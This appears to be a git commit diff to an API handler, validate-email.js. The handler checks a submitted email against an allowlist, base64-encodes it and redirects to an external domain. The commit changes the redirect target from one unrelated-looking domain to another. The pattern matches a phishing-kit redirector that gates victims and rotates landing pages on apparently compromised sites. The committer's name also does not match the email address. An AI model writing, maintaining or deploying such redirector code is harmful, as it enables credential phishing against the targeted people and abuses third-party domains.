8e271e6ec69e61be300a965cfcb153fc8d80c558
Kproyr <kpryor@ketchum.edu>
2025-02-10 16:56:33 -0800

    Update validate-email.js

--- api/validate-email.js
+++ api/validate-email.js
@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "https://static.bodegavicttorias.com/?hi=";
+      const baseURL = "https://modeg.joondaluppodiatry.com.au/?vi=";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
